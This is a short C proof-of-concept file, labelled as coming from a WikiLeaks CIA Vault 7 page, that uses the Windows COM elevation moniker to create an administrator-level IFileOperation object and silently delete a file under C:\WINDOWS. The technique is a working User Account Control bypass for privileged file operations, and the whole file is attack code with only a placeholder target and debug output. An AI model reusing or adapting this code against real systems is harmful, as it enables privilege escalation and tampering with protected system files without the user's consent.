// soruce: https://wikileaks.org/ciav7p1/cms/page_3375231.html
// patched

#include <stdio.h>
#include <Shobjidl.h>
#include <windows.h>

#include <strsafe.h>

//DEFINE_GUID(CLSID_FileOperation, 0x3ad05575, 0x8857, 0x4850, 0x92,0x77, 0x11,0xb8,0x5b,0xdb,0x8e,0x09);

const CLSID CLSID_FileOperation_ = {  0x3ad05575, 0x8857, 0x4850, 0x92,0x77, 0x11,0xb8,0x5b,0xdb,0x8e,0x09 };

HRESULT CoCreateInstanceAsAdmin(HWND hwnd, REFCLSID rclsid, REFIID riid, void **ppv) {
	BIND_OPTS3 bo;
	WCHAR wszCLSID[50];
	WCHAR wszMon[300];
	
	StringFromGUID2(rclsid, wszCLSID, sizeof(wszCLSID)/sizeof(wszCLSID[0]));
	HRESULT hr = StringCchPrintfW(wszMon, sizeof(wszMon)/sizeof(wszMon[0]), L"Elevation:Administrator!new:%s", wszCLSID);
	if (FAILED(hr))
		return hr;
	memset(&bo, 0, sizeof(bo));
	bo.cbStruct = sizeof(bo);
	bo.hwnd = hwnd;
	bo.dwClassContext = CLSCTX_LOCAL_SERVER;
	return CoGetObject(wszMon, &bo, riid, ppv);
}
 
void ElevatedDelete() {
	MessageBox(NULL, "DELETING", "TESTING", MB_OK);
	
	// This is only availabe on Vista and higher
	HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
	printf("CoInitializeEx: %ld\n", hr);
	IFileOperation *pfo;
	hr = CoCreateInstanceAsAdmin(NULL, CLSID_FileOperation_, IID_PPV_ARGS(&pfo));
	printf("CoCreateInstanceAsAdmin: %ld\n", hr);
	pfo->SetOperationFlags(FOF_NO_UI);
	IShellItem *item = NULL;
	hr = SHCreateItemFromParsingName(L"C:\\WINDOWS\\TEST.DLL", NULL, IID_PPV_ARGS(&item));
	printf("SHCreateItemFromParsingName: %ld\n", hr);
	pfo->DeleteItem(item, NULL);
	pfo->PerformOperations();
	item->Release();
	pfo->Release();
	CoUninitialize();
	
}

int main() {
	ElevatedDelete();
}